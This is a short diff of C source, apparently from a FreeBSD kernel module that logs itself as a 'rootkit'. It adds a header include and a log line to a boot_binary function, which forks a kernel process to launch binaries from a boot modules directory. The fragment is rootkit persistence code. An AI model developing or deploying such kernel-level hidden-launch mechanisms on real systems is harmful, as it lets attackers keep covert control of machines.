@@ -15,6 +15,7 @@
 #include <sys/sysproto.h>
 #include <sys/malloc.h>
 #include <sys/libkern.h>
+#include <sys/unistd.h>
 
 #define BIN_PATH "/boot/modules/data/"
 MALLOC_DEFINE(BINARY_BOOT, "binary_boot", "binary_boot");
@@ -40,6 +41,7 @@ int boot_binary(char *path){
 		fr.fr_flags = RFFDG | RFPROC;
 		fr.fr_pidp = &pid;
 		error = fork1(first_thread, &fr);
+		LOGI("[rootkit:boot_binary] forked PID %d\n", pid);
 	}
 
 
